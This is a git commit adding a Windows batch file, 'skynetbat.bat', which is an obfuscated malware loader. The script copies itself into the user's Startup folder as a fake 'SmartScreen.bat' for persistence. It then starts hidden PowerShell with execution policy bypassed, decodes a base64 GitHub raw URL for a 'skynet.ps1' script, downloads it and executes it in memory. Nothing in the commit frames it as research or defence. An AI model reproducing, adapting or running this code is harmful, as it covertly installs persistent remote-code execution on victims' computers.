6294355cc8214bd32f518e8f580bef7de9fcd1cc
poxxc56 <poxxcon2@protonmail.com>
2025-05-25 08:16:55 -0700

    Add files via upload

---
+++ skynetbat.bat
@@ -0,0 +1,9 @@
+@EchO off
+seT "lnikGwqa=%~f0"
+Set "uOPlcveM=%APPDATA%\Microsoft\Windows\Start Menu\Programs\Startup\SmartScreen.bat"
+cOpY /Y "%lnikGwqa%" "%uOPlcveM%" >nul
+sET "DMTMcQRm=##PAYLOAD_URL_B64_PLACEHOLDER##"
+seT IbKTQaAF=poWERsHEll
+sTArT "" /B coNhoST.eXE --headless -- POweRshELL -ExecUTIoNpoLiCY bYPAss -COMMANd "& { $u=[System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String('%aHR0cHM6Ly9yYXcuZ2l0aHVidXNlcmNvbnRlbnQuY29tL3BveHhjNTYvWXQvcmVmcy9oZWFkcy9tYWluL3NreW5ldC5wczE=%'));(nEw-OBJect SysTem.NET.WeBcliENT).dOWnlOAdSTriNg($u) | InvOKE-eXpresSiON }"
+TimEOUT /t 1 /nobreak >nul
+eXit
